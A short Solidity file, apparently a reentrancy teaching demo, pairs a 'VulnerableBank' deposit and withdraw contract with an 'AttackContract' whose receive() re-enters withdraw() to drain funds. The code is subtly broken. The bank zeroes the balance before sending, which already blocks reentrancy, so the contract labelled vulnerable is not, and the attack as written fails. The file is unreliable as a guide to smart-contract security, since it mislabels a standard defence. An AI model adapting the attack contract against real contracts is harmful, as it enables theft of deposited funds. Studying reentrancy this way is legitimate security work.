// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping (address => uint256) public balances;

    function deposit() public payable {
        require(msg.value > 0, "Harus deposit lebih dari 0");
        balances[msg.sender] += msg.value;
    } 

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer gagal");
    }
}

contract AttackContract {
    VulnerableBank public bank;

    constructor(address _bankaddress) {
        bank = VulnerableBank(_bankaddress);
    }

    function attack() public payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
     }
}